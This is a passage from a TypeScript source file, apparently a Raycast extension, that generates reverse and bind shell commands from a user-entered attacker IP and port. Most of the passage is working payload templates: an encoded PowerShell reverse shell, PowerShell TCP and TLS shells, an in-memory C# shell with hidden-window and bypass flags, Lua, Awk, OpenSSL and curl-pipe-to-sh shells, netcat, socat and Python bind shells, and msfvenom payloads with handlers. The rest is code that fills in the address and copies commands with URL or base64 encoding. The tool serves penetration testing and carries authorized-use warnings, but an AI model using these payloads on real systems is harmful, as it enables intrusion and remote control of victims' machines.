      "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBJAFAAfQAiACwAewBQAE8AUgBUAH0AKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwAGUAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
    description: "Base64 encoded PowerShell shell",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  {
    type: "powershell-3",
    name: "PowerShell #3",
    icon: "⚡",
    command:
      "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r+=[char]13+[char]10;$s.Write([byte[]]([Text.UTF8Encoding]::UTF8.GetBytes($r)),0,$r.Length)}$c.Close()\"",
    description: "PowerShell reverse shell #3",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "powershell-4-tls",
    name: "PowerShell #4 (TLS)",
    icon: "⚡",
    command:
      "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$s=$c.GetStream();$ssl=New-Object System.Net.Security.SslStream($s);$ssl.AuthenticateAsClient('{IP}');[byte[]]$b=0..65535|%%{0};while(($i=$ssl.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$ssl.Write([byte[]]([Text.UTF8Encoding]::UTF8.GetBytes($r)),0,$r.Length)}$c.Close()\"",
    description: "PowerShell reverse shell with TLS",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: "openssl s_server -quiet -key key.pem -cert cert.pem -port {PORT}",
  },
  {
    type: "windows-conpty",
    name: "Windows ConPty",
    icon: "🪟",
    command: "stty raw -echo; (stty size; cat) | nc -lvnp {PORT}",
    description: "Windows ConPty reverse shell",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "csharp",
    name: "C# TCP Client",
    icon: "🔷",
    command:
      'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=\'using System;using System.IO;using System.Net;using System.Net.Sockets;using System.Diagnostics;class P{static StreamWriter w;static void Main(){using(var c=new TcpClient(\\"{IP}\\",{PORT})){var s=c.GetStream();w=new StreamWriter(s);var r=new StreamReader(s);var p=new Process();p.StartInfo.FileName=\\"cmd.exe\\";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;p.OutputDataReceived+=(x,e)=>{try{w.WriteLine(e.Data);w.Flush();}catch{}};p.Start();p.BeginOutputReadLine();while(true){var l=r.ReadLine();p.StandardInput.WriteLine(l);}}}}\'; Add-Type -TypeDefinition $c -Language CSharp; [P]::Main()"',
    description: "C# TCP Client reverse shell (PowerShell compile-in-memory)",
    category: "reverse",
    subcategory: "Windows",
    os: ["windows"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },

  // ========== Bind Shells ==========
  {
    type: "bind-nc",
    name: "Netcat Bind",
    icon: "🔗",
    command: "nc -lvp {PORT} -e /bin/sh",
    description: "Netcat bind shell (Linux)",
    category: "bind",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "nc -v {IP} {PORT}",
  },
  {
    type: "bind-nc-windows",
    name: "Netcat Bind (Windows)",
    icon: "🔗",
    command: "nc.exe -lvp {PORT} -e cmd.exe",
    description: "Netcat bind shell (Windows)",
    category: "bind",
    subcategory: "Shell Tools",
    os: ["windows"],
    listener: "nc -v {IP} {PORT}",
  },
  {
    type: "bind-socat",
    name: "Socat Bind",
    icon: "🔌",
    command: "socat TCP-LISTEN:{PORT},fork EXEC:/bin/sh",
    description: "Socat bind shell",
    category: "bind",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "socat - TCP:{IP}:{PORT}",
  },
  {
    type: "bind-python",
    name: "Python Bind",
    icon: "🐍",
    command:
      'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{PORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    description: "Python bind shell",
    category: "bind",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: "nc -v {IP} {PORT}",
  },

  // ========== Additional Reverse Shells ==========
  {
    type: "lua",
    name: "Lua",
    icon: "🌙",
    command:
      "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    description: "Lua socket reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "openssl-rev",
    name: "OpenSSL",
    icon: "🔐",
    command:
      "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {IP}:{PORT} > /tmp/s; rm /tmp/s",
    description: "OpenSSL encrypted reverse shell",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener:
      "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes 2>/dev/null && openssl s_server -quiet -key key.pem -cert cert.pem -port {PORT}",
  },
  {
    type: "awk-rev",
    name: "Awk",
    icon: "📊",
    command:
      'awk \'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell> " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\'',
    description: "Awk reverse shell",
    category: "reverse",
    subcategory: "Scripting Languages",
    os: ["linux", "mac"],
    listener: `nc -lvnp {PORT}
# Alternatives: FreeBSD: nc -l {PORT}, Busybox: busybox nc -l -p {PORT}, Ncat TLS: ncat --ssl -lvnp {PORT}, rlwrap: rlwrap nc -lvnp {PORT}`,
  },
  {
    type: "curl-rev",
    name: "Curl",
    icon: "🌐",
    command: "curl {IP}:{PORT} | sh",
    description: "Curl reverse shell (requires listener to serve shell script)",
    category: "reverse",
    subcategory: "Shell Tools",
    os: ["linux", "mac"],
    listener: "while true; do printf '$ ' | nc -lvnp {PORT}; done",
  },

  // ========== MSFVenom Payloads ==========
  {
    type: "msfvenom-linux-x64",
    name: "MSFVenom Linux x64",
    icon: "🎯",
    command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
    description: "MSFVenom Linux x64 ELF reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["linux"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
  {
    type: "msfvenom-linux-x86",
    name: "MSFVenom Linux x86",
    icon: "🎯",
    command: "msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf",
    description: "MSFVenom Linux x86 ELF reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["linux"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
  {
    type: "msfvenom-windows-x64",
    name: "MSFVenom Windows x64",
    icon: "🎯",
    command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
    description: "MSFVenom Windows x64 EXE reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["windows"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
  {
    type: "msfvenom-windows-x86",
    name: "MSFVenom Windows x86",
    icon: "🎯",
    command: "msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
    description: "MSFVenom Windows x86 EXE reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["windows"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
  {
    type: "msfvenom-mac",
    name: "MSFVenom macOS",
    icon: "🎯",
    command: "msfvenom -p osx/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f macho > shell.macho",
    description: "MSFVenom macOS Mach-O reverse shell",
    category: "msfvenom",
    subcategory: "Payload Generators",
    os: ["mac"],
    listener:
      'msfconsole -q -x "use exploit/multi/handler; set payload osx/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {PORT}; run"',
  },
];

// ============================================================================
// Utility Functions
// ============================================================================

// Generate all commands
function generateAllCommands(ip: string, port: string): ShellTemplate[] {
  return SHELL_TEMPLATES.map((template) => {
    // Special handling for powershell-base64 template
    if (template.type === "powershell-base64") {
      // Get the raw PowerShell command from powershell-1 template
      const powershell1 = SHELL_TEMPLATES.find((t) => t.type === "powershell-1");
      if (powershell1) {
        // Replace IP and PORT in the raw command
        const replaced = powershell1.command.replace(/{IP}/g, ip).replace(/{PORT}/g, port);
        // Extract just the PowerShell command part after -Command
        const cmdMatch = replaced.match(/-Command\s+(.+)/);
        if (cmdMatch) {
          // Encode the command part to UTF-16LE and then base64
          const encoded = Buffer.from(cmdMatch[1], "utf16le").toString("base64");
          return {
            ...template,
            command: `powershell -e ${encoded}`,
            listener: template.listener?.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
          };
        }
      }
    }

    // Standard handling for all other templates
    return {
      ...template,
      command: template.command.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
      listener: template.listener?.replace(/{IP}/g, ip).replace(/{PORT}/g, port),
    };
  });
}

// Group by OS
function groupByOS(commands: ShellTemplate[]): Record<string, ShellTemplate[]> {
  const groups: Record<string, ShellTemplate[]> = {};
  commands.forEach((cmd) => {
    cmd.os.forEach((osKey) => {
      if (!groups[osKey]) {
        groups[osKey] = [];
      }
      groups[osKey].push(cmd);
    });
  });
  const sortedGroups: Record<string, ShellTemplate[]> = {};
  const osOrder = ["linux", "mac", "windows"];
  osOrder.forEach((os) => {
    if (groups[os]) {
      sortedGroups[os] = groups[os];
    }
  });
  Object.keys(groups).forEach((os) => {
    if (!sortedGroups[os]) {
      sortedGroups[os] = groups[os];
    }
  });
  return sortedGroups;
}

// ============================================================================
// LocalStorage Functions
// ============================================================================

const STORAGE_KEY_IP = "lastIP";
const STORAGE_KEY_PORT = "lastPort";

async function loadConfig(): Promise<Config> {
  const ip = (await LocalStorage.getItem<string>(STORAGE_KEY_IP)) || "10.10.10.10";
  const port = (await LocalStorage.getItem<string>(STORAGE_KEY_PORT)) || "9001";
  return { ip, port };
}

async function saveConfig(config: Config): Promise<void> {
  await LocalStorage.setItem(STORAGE_KEY_IP, config.ip);
  await LocalStorage.setItem(STORAGE_KEY_PORT, config.port);
}

// ============================================================================
// Components
// ============================================================================

interface FormValues {
  ip: string;
  port: string;
}

// Display all generated commands list
function ShowAllCommands({ ip, port }: FormValues) {
  const { pop } = useNavigation();
  const [osFilter, setOsFilter] = useState<string>("all");
  const [sortBy, setSortBy] = useState<string>("category");

  // Generate all commands
  const allCommands = generateAllCommands(ip, port);

  // OS filtering
  const filteredCommands =
    osFilter === "all"
      ? allCommands
      : allCommands.filter((cmd) => cmd.os.includes(osFilter as "linux" | "windows" | "mac"));

  // Sorting
  const sortedCommands = [...filteredCommands].sort((a, b) => {
    switch (sortBy) {
      case "name":
        return a.name.localeCompare(b.name);
      case "os":
        return a.os[0].localeCompare(b.os[0]);
      case "category":
      default:
        return a.subcategory.localeCompare(b.subcategory);
    }
  });

  const groupedCommands = sortBy === "os" ? groupByOS(sortedCommands) : groupBySubcategory(sortedCommands);

  return (
    <List
      navigationTitle={`Reverse Shell Commands - ${ip}:${port}`}
      searchBarPlaceholder="Search shell types..."
      isShowingDetail
      searchBarAccessory={
        <List.Dropdown tooltip="Filter by OS" value={osFilter} onChange={setOsFilter}>
          <List.Dropdown.Item title="All Systems" value="all" />
          <List.Dropdown.Item title="Linux" value="linux" icon="🐧" />
          <List.Dropdown.Item title="Windows" value="windows" icon="🪟" />
          <List.Dropdown.Item title="macOS" value="mac" icon="🍎" />
        </List.Dropdown>
      }
    >
      {Object.entries(groupedCommands).map(([groupKey, cmds]) => {
        const sectionTitle =
          sortBy === "os"
            ? { linux: "🐧 Linux", mac: "🍎 macOS", windows: "🪟 Windows" }[groupKey] || groupKey
            : groupKey;
        return (
          <List.Section key={groupKey} title={sectionTitle}>
            {cmds.map((cmd) => (
              <List.Item
                key={cmd.type}
                icon={cmd.icon}
                title={cmd.name}
                accessories={cmd.os.map((os) => ({
                  tag: { value: os.toUpperCase(), color: getOSTagColor(os) },
                }))}
                detail={
                  <List.Item.Detail
                    markdown={`
# ${cmd.icon} ${cmd.name}

## Description
${cmd.description}

## Target Configuration
- **IP Address**: ${ip}
- **Port**: ${port}
- **Supported OS**: ${cmd.os.map((o) => o.toUpperCase()).join(", ")}

## Generated Command

\`\`\`bash
${cmd.command}
\`\`\`

${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : ""}

---

> ⚠️ **Security Warning**
>
> This command should only be used in authorized security testing environments.
> Unauthorized use of reverse shells may violate laws and regulations.
`}
                  />
                }
                actions={
                  <ActionPanel>
                    <Action.CopyToClipboard
                      title="Copy Command"
                      content={cmd.command}
                      shortcut={{ modifiers: ["cmd"], key: "c" }}
                      onCopy={() => {
                        showToast({
                          style: Toast.Style.Success,
                          title: "Copied to Clipboard",
                          message: cmd.name,
                        });
                      }}
                    />
                    <Action.CopyToClipboard
                      title="Copy URL Encoded"
                      content={urlEncode(cmd.command)}
                      shortcut={{ modifiers: ["cmd", "shift"], key: "u" }}
                      onCopy={() => {
                        showToast({
                          style: Toast.Style.Success,
                          title: "Copied URL Encoded Command",
                          message: cmd.name,
                        });
                      }}
                    />
                    <Action.CopyToClipboard
                      title="Copy Base64 Encoded"
                      content={base64Encode(cmd.command)}
                      shortcut={{ modifiers: ["cmd", "shift"], key: "b" }}
                      onCopy={() => {
                        showToast({
                          style: Toast.Style.Success,
                          title: "Copied Base64 Encoded Command",
                          message: cmd.name,
                        });
                      }}
                    />
                    {cmd.listener && (
                      <Action.CopyToClipboard
                        title="Copy Listener Command"
                        content={cmd.listener}
                        shortcut={{ modifiers: ["cmd", "shift"], key: "l" }}
                        onCopy={() => {
                          showToast({
                            style: Toast.Style.Success,
                            title: "Copied Listener Command",
                            message: cmd.name,
                          });
                        }}
                      />
                    )}
                    <Action
                      title="Save to File"
                      icon={Icon.Download}
                      shortcut={{ modifiers: ["cmd"], key: "s" }}
                      onAction={async () => {
                        try {
                          const filePath = join(
                            homedir(),
                            "Downloads",
                            `${cmd.type}_${Date.now()}${getFileExtension(cmd.type)}`,
                          );
                          await writeFile(filePath, cmd.command);
                          showToast({
                            style: Toast.Style.Success,
                            title: "Saved to File",
                            message: filePath,
                          });
                        } catch (error) {
                          showToast({
                            style: Toast.Style.Failure,
                            title: "Save Failed",
                            message: error instanceof Error ? error.message : "Unknown error",
                          });
                        }
                      }}
                    />
                    <ActionPanel.Section title="Sort">
                      <Action
                        title="Sort by Category"
                        icon={Icon.AppWindowList}
                        shortcut={{ modifiers: ["cmd", "shift"], key: "1" }}
                        onAction={() => setSortBy("category")}
                      />
                      <Action
                        title="Sort by Name"
                        icon={Icon.Text}
                        shortcut={{ modifiers: ["cmd", "shift"], key: "2" }}
                        onAction={() => setSortBy("name")}
                      />
                      <Action
                        title="Sort by OS"
                        icon={Icon.ComputerChip}
                        shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
                        onAction={() => setSortBy("os")}
                      />
                    </ActionPanel.Section>
                    <Action
                      title="Re-enter IP/Port"
                      icon={Icon.ArrowClockwise}
                      shortcut={{ modifiers: ["cmd"], key: "r" }}
                      onAction={pop}
                    />
                  </ActionPanel>
                }
              />
            ))}
          </List.Section>
        );
      })}
    </List>
  );
}

// Main form component
export default function Command() {
  const [ipError, setIpError] = useState<string | undefined>();
  const [portError, setPortError] = useState<string | undefined>();
  const [ip, setIp] = useState<string>("10.10.10.10");
  const [port, setPort] = useState<string>("9001");
  const { push } = useNavigation();

  // Load configuration in background
  useEffect(() => {
    loadConfig()
      .then((config) => {
        setIp(config.ip);
        setPort(config.port);
      })
      .catch(() => {
        // Keep default values
      });
  }, []);

  async function handleSubmit(values: FormValues) {
    // Validate IP
    if (!isValidIP(values.ip)) {
      setIpError("Invalid IP address format");
      return;
    }

    // Validate port
    if (!isValidPort(values.port)) {
      setPortError("Port must be between 1-65535");
      return;
    }

    // Clear errors
    setIpError(undefined);
    setPortError(undefined);

    // Save configuration
    await saveConfig({ ip: values.ip, port: values.port });

    // Navigate to commands list page
    push(<ShowAllCommands ip={values.ip} port={values.port} />);
  }

  function incrementPort() {
    const currentPort = parseInt(port);
    if (!isNaN(currentPort) && currentPort < 65535) {
      setPort((currentPort + 1).toString());
    }
  }

  return (
    <Form
      actions={
        <ActionPanel>
          <Action.SubmitForm title="Generate All Commands" onSubmit={handleSubmit} />
          <Action
            title="Increment Port"
            icon={Icon.Plus}
            shortcut={{ modifiers: ["cmd"], key: "=" }}
            onAction={incrementPort}
          />
        </ActionPanel>
      }
    >
      <Form.TextField
        id="ip"
        title="Target IP Address"
        placeholder="192.168.1.100"
        value={ip || "10.10.10.10"}
        error={ipError}
        onChange={(value) => {
          setIp(value);
          setIpError(undefined);
        }}
      />
      <Form.TextField
        id="port"
        title="Listener Port"
        placeholder="9001"
        value={port || "9001"}
        error={portError}
        onChange={(value) => {
          setPort(value);
          setPortError(undefined);
        }}
      />
      <Form.Description text="⚠️ Use only in authorized security testing environments | 💾 Configuration will be saved automatically" />
    </Form>
  );
}
